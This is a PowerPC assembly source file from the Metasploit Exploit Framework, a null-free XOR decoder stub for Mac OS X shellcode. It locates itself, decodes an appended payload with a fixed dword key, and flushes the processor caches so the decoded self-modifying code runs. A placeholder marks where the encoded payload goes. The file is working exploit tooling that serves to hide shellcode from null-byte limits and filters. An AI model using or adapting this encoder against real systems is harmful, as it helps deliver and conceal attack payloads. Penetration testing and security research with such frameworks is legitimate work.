;;
;
;        Name: encoder_dword_xor
;   Qualities: Null-Free Decoder
;   Platforms: MacOS X / PPC
;     Authors: H D Moore <hdm [at] metasploit.com>
;     Version: $Revision: 1612 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        A simple XOR decoder that accounts for PPC cache issues.
;        Originally based on Dino's longxor.s
;
;;

;;; Based on Dino Dai Zovi's PPC decoder (20030821) ...

.globl	main
.globl	_main

main:
_main:
	;;; PowerPC GetPC() from LSD
	xor.	r5, r5, r5
	bnel	main
	mflr	r31
	addi	r31, r31, 68+1974	; 68 = distance from branch -> payload
								; 1974 is null elliding constant
		
	subi	r5, r5, 1974		; We need this for the dcbf and icbi

	lis	r6, 0x9999				; Xor key = 0x99999999
	ori	r6, r6, 0x9999
	
	addi	r4, r5, 1974 + 4	; Number of dwords to decode
	mtctr	r4

Lxorlp:	
	;;; Load a byte, xor it, store it
	lwz	r4, -1974(r31)
	xor	r4, r4, r6
	stw	r4, -1974(r31)

	;;;
	;;; Do the self-modifying code song and dance
	;;;
	dcbf	r5, r31			; Flush data cache block to memory
	.long	0x7cff04ac		; (sync) Wait for flush to complete
	icbi	r5, r31			; Invalidate instruction cache block

	; Advance r31 to next word	
	subi	r30, r5, -1978
	add.	r31, r31, r30

	; Branch if ctr=0 
	bdnz-	Lxorlp
	.long	0x4cff012c		; (isync) Toss prefetched instructions

payload:
	;;; Insert XORed payload here
;    .long   (0x7fe00008 ^ 0x01020304)
;    .long   (0x7fe00008 ^ 0x01020304)
;    .long   (0x7fe00008 ^ 0x01020304)
;    .long   (0x7fe00008 ^ 0x01020304)
